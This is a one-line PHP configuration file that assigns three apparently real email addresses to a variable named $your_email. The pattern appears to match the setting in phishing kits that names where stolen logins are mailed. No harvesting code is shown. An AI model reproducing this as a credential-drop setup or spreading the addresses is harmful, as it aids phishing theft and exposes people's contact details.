<?php

$your_email="gangarwoodword@yandex.com, wisdomfidelis@yandex.com, gangartools@gmail.com";

?>